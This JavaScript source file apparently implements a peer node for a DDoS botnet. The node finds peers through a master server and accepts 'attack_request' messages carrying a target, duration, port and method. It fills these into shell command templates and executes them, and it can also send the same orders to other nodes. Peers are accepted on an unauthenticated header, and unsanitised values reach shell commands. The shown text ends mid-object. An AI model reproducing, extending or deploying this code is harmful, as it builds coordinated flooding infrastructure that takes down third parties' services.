import EventEmitter from 'events';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';

/**
 * P2P Hybrid System - HOTFIX VERSION
 * 
 * Fixes:
 * 1. Port type conversion (string -> number)
 * 2. Reachability checking for null peers
 * 3. Auto-connect to all DIRECT mode peers (not just reachable)
 * 4. Better peer filtering
 */

class P2PHybridNode extends EventEmitter {
  constructor(config, executor, methodsConfig) {
    super();
    
    this.config = config;
    this.executor = executor;
    this.methodsConfig = methodsConfig || {};
    this.nodeId = config.NODE.ID;
    this.nodeIp = config.NODE.IP;
    this.nodePort = config.SERVER.PORT;
    
    // Peer connections
    this.peers = new Map();
    this.pendingConnections = new Map();
    this.connectionLocks = new Set();
    
    // Discovery
    this.knownPeers = new Map();
    this.peerBlacklist = new Map();
    
    // Message queue
    this.messageQueue = new Map();
    
    // WebSocket server
    this.wss = null;
    this.isServerReady = false;
    
    // Stats
    this.stats = {
      directConnections: 0,
      relayedConnections: 0,
      messagesReceived: 0,
      messagesSent: 0,
      messagesQueued: 0,
      messagesRelayed: 0,
      peersDiscovered: 0,
      connectionAttempts: 0,
      connectionFailures: 0,
      connectionSuccesses: 0,
      lastDiscovery: null,
      lastAutoConnect: null
    };
    
    // Configuration
    this.p2pConfig = {
      enabled: config.P2P?.ENABLED !== false,
      discoveryInterval: config.P2P?.DISCOVERY_INTERVAL || 60000,
      peerTimeout: config.P2P?.PEER_TIMEOUT || 180000,
      maxPeers: config.P2P?.MAX_PEERS || 50,
      autoConnect: config.P2P?.AUTO_CONNECT !== false,
      relayFallback: config.P2P?.RELAY_FALLBACK !== false,
      heartbeatInterval: config.P2P?.HEARTBEAT_INTERVAL || 30000,
      connectionTimeout: config.P2P?.CONNECTION_TIMEOUT || 10000,
      maxConnectionAttempts: 3,
      connectionBackoffMs: 5000,
      blacklistDuration: 300000,
      messageQueueSize: 100,
      autoConnectDelay: 10000,
      cleanupInterval: 60000
    };
    
    // Encryption
    this.encryptionManager = null;
    
    // Intervals
    this.discoveryInterval = null;
    this.peerCleanupInterval = null;
    this.heartbeatInterval = null;
    this.autoConnectInterval = null;
    
    // Shutdown flag
    this.isShuttingDown = false;
    
    // Request handlers
    this.requestHandlers = new Map();
    
    // Master connection
    this.masterReachable = false;
    this.lastMasterCheck = null;
    
    console.log('[P2P] P2P Hybrid Node initialized', {
      nodeId: this.nodeId,
      enabled: this.p2pConfig.enabled,
      maxPeers: this.p2pConfig.maxPeers
    });
  }
  
  setEncryptionManager(manager) {
    this.encryptionManager = manager;
    console.log('[P2P] Encryption manager set');
  }
  
  async startP2PServer(fastifyServer) {
    if (!this.p2pConfig.enabled) {
      console.log('[P2P] P2P is disabled');
      return false;
    }
    
    try {
      this.wss = new WebSocketServer({ 
        noServer: true,
        clientTracking: true,
        perMessageDeflate: false
      });
      
      fastifyServer.server.on('upgrade', (request, socket, head) => {
        try {
          const url = new URL(request.url, `http://${request.headers.host}`);
          const pathname = url.pathname;
          
          if (pathname === '/p2p') {
            console.log('[P2P-SERVER] Handling P2P WebSocket upgrade');
            this.wss.handleUpgrade(request, socket, head, (ws) => {
              this.wss.emit('connection', ws, request);
            });
          }
        } catch (error) {
          console.error('[P2P-SERVER] Upgrade error:', error.message);
          socket.destroy();
        }
      });
      
      this.wss.on('connection', (ws, request) => {
        this.handleIncomingPeerConnection(ws, request);
      });
      
      this.wss.on('error', (error) => {
        console.error('[P2P-SERVER] WebSocket server error:', error.message);
      });
      
      this.isServerReady = true;
      console.log(`[P2P-SERVER] P2P server started on port ${this.nodePort}`);
      
      await this.checkMasterConnectivity();
      
      setTimeout(() => this.startPeerDiscovery(), 2000);
      setTimeout(() => this.startPeerCleanup(), 5000);
      setTimeout(() => this.startPeerHeartbeat(), 3000);
      setTimeout(() => this.startAutoConnector(), 15000);
      
      console.log('[P2P-SERVER] Background tasks scheduled');
      
      return true;
      
    } catch (error) {
      console.error('[P2P-SERVER] Failed to start P2P server:', error.message);
      this.cleanup();
      return false;
    }
  }
  
  async checkMasterConnectivity() {
    if (!this.config.MASTER?.URL) {
      console.log('[P2P] No master URL configured');
      this.masterReachable = false;
      return false;
    }
    
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      
      const response = await globalThis.fetch(
        `${this.config.MASTER.URL}/api/status`,
        { signal: controller.signal }
      );
      
      clearTimeout(timeout);
      
      this.masterReachable = response.ok;
      this.lastMasterCheck = Date.now();
      
      console.log(`[P2P] Master is ${this.masterReachable ? 'reachable' : 'unreachable'}`);
      
      return this.masterReachable;
      
    } catch (error) {
      console.log('[P2P] Master check failed:', error.message);
      this.masterReachable = false;
      this.lastMasterCheck = Date.now();
      return false;
    }
  }
  
  handleIncomingPeerConnection(ws, request) {
    const remoteNodeId = request.headers['x-node-id'];
    const remoteIp = request.headers['x-forwarded-for'] || 
                     request.socket.remoteAddress?.replace('::ffff:', '');
    
    console.log('[P2P-SERVER] New peer connection attempt:', {
      remoteNodeId,
      remoteIp
    });
    
    if (!remoteNodeId) {
      console.log('[P2P-SERVER] Rejected: Missing node ID');
      ws.close(4000, 'Missing node ID');
      return;
    }
    
    if (remoteNodeId === this.nodeId) {
      console.log('[P2P-SERVER] Rejected: Self-connection attempt');
      ws.close(4001, 'Cannot connect to self');
      return;
    }
    
    if (this.isBlacklisted(remoteNodeId)) {
      console.log('[P2P-SERVER] Rejected: Blacklisted');
      ws.close(4002, 'Blacklisted');
      return;
    }
    
    if (this.peers.size >= this.p2pConfig.maxPeers) {
      console.log('[P2P-SERVER] Rejected: Max peers reached');
      ws.close(4003, 'Max peers reached');
      return;
    }
    
    if (this.peers.has(remoteNodeId)) {
      console.log('[P2P-SERVER] Peer already connected, replacing old connection');
      const oldPeer = this.peers.get(remoteNodeId);
      try {
        oldPeer.ws.close();
      } catch (e) {}
      this.peers.delete(remoteNodeId);
    }
    
    const peerInfo = {
      ws,
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: null,
      connected: true,
      direct: true,
      lastSeen: Date.now(),
      lastHeartbeat: Date.now(),
      messagesReceived: 0,
      messagesSent: 0,
      connectedAt: Date.now(),
      capabilities: null
    };
    
    this.peers.set(remoteNodeId, peerInfo);
    this.connectionLocks.delete(remoteNodeId);
    this.stats.directConnections++;
    this.stats.connectionSuccesses++;
    
    this.sendToPeer(remoteNodeId, {
      type: 'welcome',
      nodeId: this.nodeId,
      ip: this.nodeIp,
      port: this.nodePort,
      timestamp: Date.now(),
      capabilities: {
        encryption: !!this.encryptionManager,
        methods: Object.keys(this.methodsConfig),
        relay: this.p2pConfig.relayFallback && this.masterReachable,
        version: '2.0'
      }
    });
    
    ws.on('message', (data) => {
      this.handlePeerMessage(remoteNodeId, data);
    });
    
    ws.on('close', (code, reason) => {
      console.log(`[P2P] Peer ${remoteNodeId} disconnected (code: ${code})`);
      this.handlePeerDisconnected(remoteNodeId, code, reason);
    });
    
    ws.on('error', (error) => {
      console.error(`[P2P] Peer ${remoteNodeId} error:`, error.message);
    });
    
    ws.on('pong', () => {
      if (this.peers.has(remoteNodeId)) {
        this.peers.get(remoteNodeId).lastSeen = Date.now();
      }
    });
    
    this.emit('peer_connected', {
      nodeId: remoteNodeId,
      ip: remoteIp,
      direct: true
    });
    
    this.processQueuedMessages(remoteNodeId);
    
    console.log(`[P2P] Peer ${remoteNodeId} connected successfully (direct)`);
  }
  
  handlePeerDisconnected(nodeId, code, reason) {
    this.peers.delete(nodeId);
    this.connectionLocks.delete(nodeId);
    
    this.emit('peer_disconnected', { 
      nodeId,
      code,
      reason: reason?.toString() || 'Unknown'
    });
  }
  
  isBlacklisted(nodeId) {
    if (!this.peerBlacklist.has(nodeId)) {
      return false;
    }
    
    const entry = this.peerBlacklist.get(nodeId);
    if (Date.now() > entry.until) {
      this.peerBlacklist.delete(nodeId);
      return false;
    }
    
    return true;
  }
  
  blacklistPeer(nodeId, reason, duration = null) {
    const until = Date.now() + (duration || this.p2pConfig.blacklistDuration);
    this.peerBlacklist.set(nodeId, { reason, until });
    console.log(`[P2P] Blacklisted peer ${nodeId} for ${Math.round((until - Date.now())/1000)}s: ${reason}`);
  }
  
  // FIX: Normalize port to number
  normalizePort(port) {
    if (typeof port === 'string') {
      return parseInt(port, 10);
    }
    return port;
  }
  
  async connectToPeer(nodeId, peerInfo, retryAttempt = 0) {
    if (nodeId === this.nodeId) {
      return { success: false, error: 'Cannot connect to self' };
    }
    
    // FIX: Normalize port
    const normalizedPort = this.normalizePort(peerInfo.port);
    
    if (peerInfo.ip === this.nodeIp && normalizedPort === this.nodePort) {
      return { success: false, error: 'Cannot connect to self (same IP:port)' };
    }
    
    if (this.peers.has(nodeId)) {
      return { success: true, existing: true };
    }
    
    if (this.isBlacklisted(nodeId)) {
      return { success: false, error: 'Peer is blacklisted' };
    }
    
    if (this.connectionLocks.has(nodeId)) {
      return { success: false, error: 'Connection already in progress' };
    }
    
    if (this.peers.size >= this.p2pConfig.maxPeers) {
      return { success: false, error: 'Max peers reached' };
    }
    
    if (retryAttempt >= this.p2pConfig.maxConnectionAttempts) {
      this.blacklistPeer(nodeId, `Max connection attempts (${retryAttempt}) reached`);
      return { success: false, error: 'Max attempts reached' };
    }
    
    if (!peerInfo.ip || !normalizedPort) {
      return { success: false, error: 'Missing peer IP or port' };
    }
    
    this.connectionLocks.add(nodeId);
    this.stats.connectionAttempts++;
    
    try {
      const wsUrl = `ws://${peerInfo.ip}:${normalizedPort}/p2p`;
      
      console.log(`[P2P] Connecting to peer ${nodeId} at ${wsUrl} (attempt ${retryAttempt + 1}/${this.p2pConfig.maxConnectionAttempts})`);
      
      const ws = new WebSocket(wsUrl, {
        headers: {
          'X-Node-ID': this.nodeId,
          'X-Node-IP': this.nodeIp || 'unknown',
          'X-Node-Port': this.nodePort.toString()
        },
        handshakeTimeout: this.p2pConfig.connectionTimeout
      });
      
      return new Promise((resolve) => {
        const timeout = setTimeout(() => {
          ws.close();
          this.connectionLocks.delete(nodeId);
          this.stats.connectionFailures++;
          
          if (retryAttempt < this.p2pConfig.maxConnectionAttempts - 1) {
            const backoff = this.p2pConfig.connectionBackoffMs * (retryAttempt + 1);
            console.log(`[P2P] Connection timeout, retrying in ${backoff}ms...`);
            setTimeout(() => {
              this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
            }, backoff);
          }
          
          resolve({ success: false, error: 'Connection timeout' });
        }, this.p2pConfig.connectionTimeout);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          
          const peer = {
            ws,
            nodeId,
            ip: peerInfo.ip,
            port: normalizedPort,
            connected: true,
            direct: true,
            lastSeen: Date.now(),
            lastHeartbeat: Date.now(),
            messagesReceived: 0,
            messagesSent: 0,
            connectedAt: Date.now(),
            capabilities: peerInfo.capabilities || null
          };
          
          this.peers.set(nodeId, peer);
          this.connectionLocks.delete(nodeId);
          this.stats.directConnections++;
          this.stats.connectionSuccesses++;
          
          ws.on('message', (data) => {
            this.handlePeerMessage(nodeId, data);
          });
          
          ws.on('close', (code, reason) => {
            console.log(`[P2P] Peer ${nodeId} disconnected (code: ${code})`);
            this.handlePeerDisconnected(nodeId, code, reason);
          });
          
          ws.on('error', (error) => {
            console.error(`[P2P] Peer ${nodeId} error:`, error.message);
          });
          
          ws.on('pong', () => {
            if (this.peers.has(nodeId)) {
              this.peers.get(nodeId).lastSeen = Date.now();
            }
          });
          
          this.emit('peer_connected', {
            nodeId,
            ip: peerInfo.ip,
            port: normalizedPort,
            direct: true
          });
          
          this.processQueuedMessages(nodeId);
          
          console.log(`[P2P] Connected to peer ${nodeId} successfully (direct)`);
          resolve({ success: true, direct: true });
        });
        
        ws.on('error', (error) => {
          clearTimeout(timeout);
          this.connectionLocks.delete(nodeId);
          this.stats.connectionFailures++;
          
          console.log(`[P2P] Failed to connect to ${nodeId}: ${error.message}`);
          
          if (retryAttempt < this.p2pConfig.maxConnectionAttempts - 1) {
            const backoff = this.p2pConfig.connectionBackoffMs * (retryAttempt + 1);
            console.log(`[P2P] Retrying connection in ${backoff}ms...`);
            setTimeout(() => {
              this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
            }, backoff);
          }
          
          resolve({ success: false, error: error.message });
        });
      });
      
    } catch (error) {
      this.connectionLocks.delete(nodeId);
      this.stats.connectionFailures++;
      console.error(`[P2P] Connection error to ${nodeId}:`, error.message);
      return { success: false, error: error.message };
    }
  }
  
  handlePeerMessage(nodeId, data) {
    try {
      const message = JSON.parse(data.toString());
      
      if (this.peers.has(nodeId)) {
        const peer = this.peers.get(nodeId);
        peer.lastSeen = Date.now();
        peer.messagesReceived++;
      }
      
      this.stats.messagesReceived++;
      
      console.log(`[P2P] Message from ${nodeId}: ${message.type}`);
      
      switch (message.type) {
        case 'welcome':
          this.handleWelcomeMessage(nodeId, message);
          break;
          
        case 'ping':
          this.sendToPeer(nodeId, { type: 'pong', timestamp: Date.now() });
          break;
          
        case 'pong':
          if (this.peers.has(nodeId)) {
            this.peers.get(nodeId).lastHeartbeat = Date.now();
          }
          break;
          
        case 'attack_request':
          this.handleAttackRequest(nodeId, message);
          break;
          
        case 'attack_response':
          this.emit('attack_response', {
            nodeId,
            ...message
          });
          break;
          
        case 'status_request':
          this.handleStatusRequest(nodeId, message);
          break;
          
        case 'status_response':
          this.emit('status_response', {
            nodeId,
            ...message
          });
          break;
          
        case 'peer_list':
          this.handlePeerListUpdate(message);
          break;
          
        case 'relay_request':
          this.handleRelayRequest(nodeId, message);
          break;
          
        case 'relay_response':
          this.handleRelayResponse(nodeId, message);
          break;
          
        default:
          console.log(`[P2P] Unknown message type: ${message.type}`);
          this.emit('peer_message', {
            nodeId,
            message
          });
      }
      
    } catch (error) {
      console.error(`[P2P] Failed to handle message from ${nodeId}:`, error.message);
    }
  }
  
  handleWelcomeMessage(nodeId, message) {
    console.log(`[P2P] Received welcome from ${nodeId}`);
    
    if (this.peers.has(nodeId)) {
      const peer = this.peers.get(nodeId);
      peer.capabilities = message.capabilities;
      
      // FIX: Normalize port
      if (message.ip) peer.ip = message.ip;
      if (message.port) peer.port = this.normalizePort(message.port);
      
      this.knownPeers.set(nodeId, {
        nodeId,
        ip: message.ip || peer.ip,
        port: this.normalizePort(message.port || peer.port),
        mode: 'DIRECT',
        reachable: true,
        capabilities: message.capabilities,
        lastUpdate: Date.now()
      });
    }
    
    this.emit('peer_info', {
      nodeId,
      capabilities: message.capabilities
    });
  }
  
  async handleAttackRequest(nodeId, message) {
    const { requestId, target, time, port, methods } = message;
    
    console.log(`[P2P] Attack request from ${nodeId}:`, {
      target,
      time,
      methods
    });
    
    try {
      if (!this.methodsConfig[methods]) {
        this.sendToPeer(nodeId, {
          type: 'attack_response',
          requestId,
          success: false,
          error: 'INVALID_METHOD'
        });
        return;
      }
      
      const methodCfg = this.methodsConfig[methods];
      const command = methodCfg.cmd
        .replaceAll('{target}', target)
        .replaceAll('{time}', time)
        .replaceAll('{port}', port);
      
      const result = await this.executor.execute(command, {
        expectedDuration: time
      });
      
      this.sendToPeer(nodeId, {
        type: 'attack_response',
        requestId,
        success: true,
        processId: result.processId,
        pid: result.pid,
        target,
        time,
        port,
        methods
      });
      
      console.log(`[P2P] Attack executed for ${nodeId}`);
      
    } catch (error) {
      this.sendToPeer(nodeId, {
        type: 'attack_response',
        requestId,
        success: false,
        error: error.message
      });
    }
  }
  
  async handleStatusRequest(nodeId, message) {
    const { requestId } = message;
    
    try {
      const activeProcesses = this.executor.getActiveProcesses();
      
      const status = {
        nodeId: this.nodeId,
        activeProcesses: activeProcesses.length,
        methods: Object.keys(this.methodsConfig),
        peers: this.peers.size,
        uptime: process.uptime(),
        timestamp: Date.now()
      };
      
      this.sendToPeer(nodeId, {
        type: 'status_response',
        requestId,
        status
      });
      
    } catch (error) {
      this.sendToPeer(nodeId, {
        type: 'status_response',
        requestId,
        error: error.message
      });
    }
  }
  
  async handleRelayRequest(nodeId, message) {
    const { relayId, targetNodeId, payload } = message;
    
    console.log(`[P2P-RELAY] Relay request from ${nodeId} to ${targetNodeId}`);
    
    if (this.peers.has(targetNodeId)) {
      const success = this.sendToPeer(targetNodeId, {
        type: 'relayed_message',
        sourceNodeId: nodeId,
        relayId,
        payload
      });
      
      this.sendToPeer(nodeId, {
        type: 'relay_response',
        relayId,
        success,
        targetNodeId
      });
      
      if (success) {
        this.stats.messagesRelayed++;
      }
      
    } else {
      this.sendToPeer(nodeId, {
        type: 'relay_response',
        relayId,
        success: false,
        error: 'Target not connected',
        targetNodeId
      });
    }
  }
  
  handleRelayResponse(nodeId, message) {
    this.emit('relay_response', {
      relayNodeId: nodeId,
      ...message
    });
  }
  
  handlePeerListUpdate(message) {
    const { peers } = message;
    
    if (!Array.isArray(peers)) {
      return;
    }
    
    console.log(`[P2P-DISCOVERY] Received peer list: ${peers.length} peers`);
    
    let newPeers = 0;
    let updatedPeers = 0;
    
    for (const peer of peers) {
      if (!peer.node_id || peer.node_id === this.nodeId) {
        continue;
      }
      
      // FIX: Normalize port
      const normalizedPort = this.normalizePort(peer.port);
      
      if (peer.ip === this.nodeIp && normalizedPort === this.nodePort) {
        continue;
      }
      
      const existing = this.knownPeers.get(peer.node_id);
      
      if (!existing) {
        newPeers++;
        this.stats.peersDiscovered++;
      } else {
        updatedPeers++;
      }
      
      this.knownPeers.set(peer.node_id, {
        nodeId: peer.node_id,
        ip: peer.ip,
        port: normalizedPort,
        mode: peer.mode,
        reachable: peer.reachable !== false, // FIX: Default to true if null
        methods: peer.methods_supported || [],
        lastUpdate: Date.now()
      });
    }
    
    if (newPeers > 0 || updatedPeers > 0) {
      console.log(`[P2P-DISCOVERY] Updated: ${newPeers} new, ${updatedPeers} existing peers`);
    }
  }
  
  sendToPeer(nodeId, message) {
    const peer = this.peers.get(nodeId);
    
    if (!peer || !peer.connected) {
      return this.queueMessage(nodeId, message);
    }
    
    try {
      if (peer.ws.readyState === WebSocket.OPEN) {
        peer.ws.send(JSON.stringify(message));
        peer.messagesSent++;
        this.stats.messagesSent++;
        return true;
      } else {
        console.log(`[P2P] Peer ${nodeId} WebSocket not open, queuing message`);
        return this.queueMessage(nodeId, message);
      }
    } catch (error) {
      console.error(`[P2P] Failed to send to ${nodeId}:`, error.message);
      return this.queueMessage(nodeId, message);
    }
  }
  
  queueMessage(nodeId, message) {
    if (!this.messageQueue.has(nodeId)) {
      this.messageQueue.set(nodeId, []);
    }
    
    const queue = this.messageQueue.get(nodeId);
    
    if (queue.length >= this.p2pConfig.messageQueueSize) {
      queue.shift();
    }
    
    queue.push({
      message,
      timestamp: Date.now()
    });
    
    this.stats.messagesQueued++;
    
    console.log(`[P2P] Queued message for ${nodeId} (queue size: ${queue.length})`);
    
    return false;
  }
  
  processQueuedMessages(nodeId) {
    if (!this.messageQueue.has(nodeId)) {
      return;
    }
    
    const queue = this.messageQueue.get(nodeId);
    
    if (queue.length === 0) {
      return;
    }
    
    console.log(`[P2P] Processing ${queue.length} queued messages for ${nodeId}`);
    
    let sent = 0;
    let failed = 0;
    
    for (const item of queue) {
      if (this.sendToPeer(nodeId, item.message)) {
        sent++;
      } else {
        failed++;
      }
    }
    
    this.messageQueue.delete(nodeId);
    
    console.log(`[P2P] Processed queue for ${nodeId}: ${sent} sent, ${failed} failed`);
  }
  
  broadcastToPeers(message, excludeNodeId = null) {
    let sent = 0;
    
    for (const [nodeId, peer] of this.peers) {
      if (excludeNodeId && nodeId === excludeNodeId) {
        continue;
      }
      
      if (this.sendToPeer(nodeId, message)) {
        sent++;
      }
    }
    
    return sent;
  }
  
  async requestAttackFromPeer(nodeId, target, time, port, methods) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return new Promise((resolve) => {
      let timeoutId = null;
      let handlerKey = `attack_response_${requestId}`;
      
      const cleanup = () => {
        if (timeoutId) {
          clearTimeout(timeoutId);
          timeoutId = null;
        }
        if (this.requestHandlers.has(handlerKey)) {
          const handler = this.requestHandlers.get(handlerKey);
          this.removeListener('attack_response', handler);
          this.requestHandlers.delete(handlerKey);
        }
      };
      
      const handler = (data) => {
        if (data.requestId === requestId) {
          cleanup();
          resolve(data);
        }
      };
      
      this.requestHandlers.set(handlerKey, handler);
      this.on('attack_response', handler);
      
      timeoutId = setTimeout(() => {
        cleanup();
        resolve({ success: false, error: 'Timeout' });
      }, 30000);
      
      const sent = this.sendToPeer(nodeId, {
        type: 'attack_request',
        requestId,
        target,
        time,
        port,
        methods
      });
      
      if (!sent) {
        cleanup();
        resolve({ success: false, error: 'Failed to send request' });
      }
    });
  }
  
  async requestStatusFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return new Promise((resolve) => {
      let timeoutId = null;
      let handlerKey = `status_response_${requestId}`;
      
      const cleanup = () => {
        if (timeoutId) clearTimeout(timeoutId);
        if (this.requestHandlers.has(handlerKey)) {
          const handler = this.requestHandlers.get(handlerKey);
          this.removeListener('status_response', handler);
          this.requestHandlers.delete(handlerKey);
        }
      };
      
      const handler = (data) => {
        if (data.requestId === requestId) {
          cleanup();
          resolve(data);
        }
      };
      
      this.requestHandlers.set(handlerKey, handler);
      this.on('status_response', handler);
      
      timeoutId = setTimeout(() => {
        cleanup();
        resolve({ success: false, error: 'Timeout' });
      }, 10000);
      
      const sent = this.sendToPeer(nodeId, {
        type: 'status_request',
        requestId
      });
      
      if (!sent) {
        cleanup();
        resolve({ success: false, error: 'Failed to send request' });
      }
    });
  }
  
  async relayMessage(targetNodeId, message) {
    if (!this.p2pConfig.relayFallback) {
      return { success: false, error: 'Relay disabled' };
    }
    
    for (const [nodeId, peer] of this.peers) {
      if (nodeId === targetNodeId) continue;
      
      const relayId = crypto.randomBytes(8).toString('hex');
      
      return new Promise((resolve) => {
        let timeoutId = null;
        let handlerKey = `relay_response_${relayId}`;
        
        const cleanup = () => {
          if (timeoutId) clearTimeout(timeoutId);
          if (this.requestHandlers.has(handlerKey)) {
            const handler = this.requestHandlers.get(handlerKey);
            this.removeListener('relay_response', handler);
            this.requestHandlers.delete(handlerKey);
          }
        };
        
        const handler = (data) => {
          if (data.relayId === relayId) {
            cleanup();
            resolve(data);
          }
        };
        
        this.requestHandlers.set(handlerKey, handler);
        this.on('relay_response', handler);
        
        timeoutId = setTimeout(() => {
          cleanup();
          resolve({ success: false, error: 'Relay timeout' });
        }, 15000);
        
        this.sendToPeer(nodeId, {
          type: 'relay_request',
          relayId,
          targetNodeId,
          payload: message
        });
      });
    }
    
    return { success: false, error: 'No relay peer available' };
  }
  
  startPeerDiscovery() {
    if (this.discoveryInterval) {
      clearInterval(this.discoveryInterval);
    }
    
    console.log(`[P2P-DISCOVERY] Starting peer discovery every ${this.p2pConfig.discoveryInterval}ms`);
    
    setTimeout(() => this.discoverPeers(), 5000);
    
    this.discoveryInterval = setInterval(() => {
      if (!this.isShuttingDown) {
        this.discoverPeers();
      }
    }, this.p2pConfig.discoveryInterval);
  }
  
  async discoverPeers() {
    if (!this.config.MASTER?.URL) {
      console.log('[P2P-DISCOVERY] No master URL configured');
      return;
    }
    
    try {
      console.log('[P2P-DISCOVERY] Requesting peer list from master...');
      
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);
      
      const response = await globalThis.fetch(`${this.config.MASTER.URL}/api/nodes`, {
        signal: controller.signal
      });
      
      clearTimeout(timeout);
      
      if (!response.ok) {
        console.log('[P2P-DISCOVERY] Failed to get peer list:', response.status);
        this.masterReachable = false;
        return;
      }
      
      const data = await response.json();
      this.masterReachable = true;
      this.stats.lastDiscovery = Date.now();
      
      if (data.nodes && Array.isArray(data.nodes)) {
        this.handlePeerListUpdate({ peers: data.nodes });
      }
      
    } catch (error) {
      console.error('[P2P-DISCOVERY] Error:', error.message);
      this.masterReachable = false;
    }
  }
  
  startAutoConnector() {
    if (!this.p2pConfig.autoConnect) {
      console.log('[P2P-AUTO] Auto-connect disabled');
      return;
    }
    
    if (this.autoConnectInterval) {
      clearInterval(this.autoConnectInterval);
    }
    
    console.log(`[P2P-AUTO] Starting auto-connector every ${this.p2pConfig.autoConnectDelay}ms`);
    
    setTimeout(() => this.autoConnectToPeers(), this.p2pConfig.autoConnectDelay);
    
    this.autoConnectInterval = setInterval(() => {
      if (!this.isShuttingDown) {
        this.autoConnectToPeers();
      }
    }, this.p2pConfig.autoConnectDelay);
  }
  
  // FIX: Connect to ALL DIRECT mode peers, not just reachable:true
  async autoConnectToPeers() {
    if (this.isShuttingDown) {
      return;
    }
    
    if (this.peers.size >= this.p2pConfig.maxPeers) {
      console.log('[P2P-AUTO] Max peers reached, skipping auto-connect');
      return;
    }
    
    // FIX: Filter for DIRECT mode only, try to connect regardless of reachable flag
    const directPeers = Array.from(this.knownPeers.values())
      .filter(peer => 
        peer.mode === 'DIRECT' &&  // Only DIRECT mode
        !this.peers.has(peer.nodeId) &&
        !this.connectionLocks.has(peer.nodeId) &&
        !this.isBlacklisted(peer.nodeId) &&
        !(peer.ip === this.nodeIp && peer.port === this.nodePort)
      )
      .slice(0, this.p2pConfig.maxPeers - this.peers.size);
    
    if (directPeers.length === 0) {
      console.log('[P2P-AUTO] No DIRECT mode peers to connect');
      return;
    }
    
    console.log(`[P2P-AUTO] Auto-connecting to ${directPeers.length} DIRECT peers...`);
    this.stats.lastAutoConnect = Date.now();
    
    const maxParallel = 3;
    for (let i = 0; i < directPeers.length; i += maxParallel) {
      if (this.isShuttingDown) break;
      
      const batch = directPeers.slice(i, i + maxParallel);
      
      await Promise.all(
        batch.map(async peer => {
          if (this.peers.size >= this.p2pConfig.maxPeers) {
            return;
          }
          
          try {
            const result = await this.connectToPeer(peer.nodeId, peer);
            if (result.success) {
              console.log(`[P2P-AUTO] Connected to ${peer.nodeId}`);
            } else {
              console.log(`[P2P-AUTO] Failed to connect to ${peer.nodeId}: ${result.error}`);
            }
          } catch (error) {
            console.error(`[P2P-AUTO] Error connecting to ${peer.nodeId}:`, error.message);
          }
        })
      );
      
      if (i + maxParallel < directPeers.length) {
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
  }
  
  startPeerCleanup() {
    if (this.peerCleanupInterval) {
      clearInterval(this.peerCleanupInterval);
    }
    
    this.peerCleanupInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      
      const now = Date.now();
      const timeout = this.p2pConfig.peerTimeout;
      
      let removedKnown = 0;
      for (const [nodeId, peer] of this.knownPeers) {
        if (now - peer.lastUpdate > timeout * 2) {
          this.knownPeers.delete(nodeId);
          removedKnown++;
        }
      }
      if (removedKnown > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedKnown} stale peer info(s)`);
      }
      
      let removedConnections = 0;
      for (const [nodeId, peer] of this.peers) {
        if (now - peer.lastSeen > timeout) {
          console.log(`[P2P-CLEANUP] Peer ${nodeId} timed out`);
          try {
            peer.ws.close();
          } catch (e) {}
          this.peers.delete(nodeId);
          this.connectionLocks.delete(nodeId);
          removedConnections++;
        }
      }
      if (removedConnections > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedConnections} stale connection(s)`);
      }
      
      let removedLocks = 0;
      for (const nodeId of this.connectionLocks) {
        if (!this.peers.has(nodeId)) {
          this.connectionLocks.delete(nodeId);
          removedLocks++;
        }
      }
      if (removedLocks > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedLocks} orphaned lock(s)`);
      }
      
      let removedQueues = 0;
      for (const [nodeId, queue] of this.messageQueue) {
        const filtered = queue.filter(item => now - item.timestamp < 300000);
        if (filtered.length === 0) {
          this.messageQueue.delete(nodeId);
          removedQueues++;
        } else if (filtered.length < queue.length) {
          this.messageQueue.set(nodeId, filtered);
        }
      }
      if (removedQueues > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedQueues} empty message queue(s)`);
      }
      
      let removedBlacklist = 0;
      for (const [nodeId, entry] of this.peerBlacklist) {
        if (now > entry.until) {
          this.peerBlacklist.delete(nodeId);
          removedBlacklist++;
        }
      }
      if (removedBlacklist > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedBlacklist} expired blacklist entry(ies)`);
      }
      
    }, this.p2pConfig.cleanupInterval);
    
    console.log('[P2P-CLEANUP] Peer cleanup started');
  }
  
  startPeerHeartbeat() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
    }
    
    this.heartbeatInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      
      for (const [nodeId, peer] of this.peers) {
        try {
          if (peer.ws.readyState === WebSocket.OPEN) {
            peer.ws.ping();
          }
        } catch (error) {
          console.error(`[P2P-HEARTBEAT] Error pinging ${nodeId}:`, error.message);
        }
      }
      
      const now = Date.now();
      if (!this.lastMasterCheck || (now - this.lastMasterCheck > 60000)) {
        this.checkMasterConnectivity();
      }
      
    }, this.p2pConfig.heartbeatInterval);
    
    console.log(`[P2P-HEARTBEAT] Peer heartbeat started (${this.p2pConfig.heartbeatInterval}ms)`);
  }
  
  getStatus() {
    return {
      enabled: this.p2pConfig.enabled,
      nodeId: this.nodeId,
      nodeIp: this.nodeIp,
      nodePort: this.nodePort,
      serverReady: this.isServerReady,
      masterReachable: this.masterReachable,
      peers: {
        connected: this.peers.size,
        known: this.knownPeers.size,
        max: this.p2pConfig.maxPeers,
        locks: this.connectionLocks.size,
        blacklisted: this.peerBlacklist.size
      },
      messageQueue: {
        peers: this.messageQueue.size,
        totalMessages: Array.from(this.messageQueue.values())
          .reduce((sum, queue) => sum + queue.length, 0)
      },
      stats: { 
        ...this.stats,
        successRate: this.stats.connectionAttempts > 0 
          ? ((this.stats.connectionSuccesses / this.stats.connectionAttempts) * 100).toFixed(2) + '%'
          : 'N/A'
      },
      config: {
        autoConnect: this.p2pConfig.autoConnect,
        relayFallback: this.p2pConfig.relayFallback,
        maxPeers: this.p2pConfig.maxPeers,
